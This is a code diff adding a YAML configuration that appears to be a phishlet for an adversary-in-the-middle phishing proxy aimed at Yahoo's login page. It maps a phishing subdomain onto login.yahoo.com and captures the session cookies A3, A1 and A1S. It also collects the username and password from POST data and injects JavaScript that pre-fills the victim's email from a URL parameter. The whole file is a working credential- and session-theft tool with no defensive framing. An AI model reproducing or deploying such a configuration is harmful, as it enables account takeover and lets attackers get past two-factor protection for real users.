@@ -1,0 +1,35 @@
+name: 'service1'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '{{.Endpoint1}}.{hostname}'}
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['A3', 'A1', 'A1S']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.yahoo.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="username"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
